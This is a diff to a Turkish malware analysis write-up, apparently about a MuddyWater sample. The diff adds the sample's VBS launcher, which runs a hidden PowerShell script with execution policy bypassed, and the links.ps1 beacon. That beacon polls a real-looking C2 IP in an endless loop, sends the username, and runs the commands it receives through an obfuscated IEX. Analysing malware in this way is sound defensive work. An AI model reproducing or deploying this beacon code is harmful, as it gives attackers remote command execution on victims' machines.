@@ -45,9 +45,27 @@ Dinamik analiz aşamasına geçelim. XLS doyasının içeriğine izin verildiği
 
 ![Dinamik analiz 4](/Analizler/img/muddy9-Laldvbs.png)
 
+```
+Set oili = CreateObject ("WScript.Shell"):oili.run "powershell -exec bypass -file c:\users\" + CreateObject("WScript.Network").UserName + "\links\links.ps1" , 0, True
+```
+
 "links.ps1" dosyasının içeriğine baktığımızda ise "hxxp://185.118.167[.]120/" IP adresine 40 saniyede bir istek oluşturulacağını ve buradan alınan komutların çalıştırılacağını görebiliriz.
 
 ![Dinamik analiz 5](/Analizler/img/muddy10-linksps1.png)
+
+```
+for ($i=2; $i -gt 1; $i++) {
+	try{
+		$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');
+		$w.proxy=[Net.WebRequest]::GetSystemWebProxy();
+		$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4472.124 Safari/537.36|'+ $env:username;
+		$w.timeout=40000;$r='';
+		$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();
+		&("{1}{2}{0}" -f 'X','I','E') $r;
+		}
+	catch{}
+}
+```
 
 Kodun sonsuz bir döngü içerisinde olduğu ve "UserAgent" sonuna "$env:username" bilgisinin eklendiği de dikkatimizi çekmekte. (İletişim kurulan IP adresinin C2 adresi olabileceği ihtimalini arttıran olaylar ^^)
 
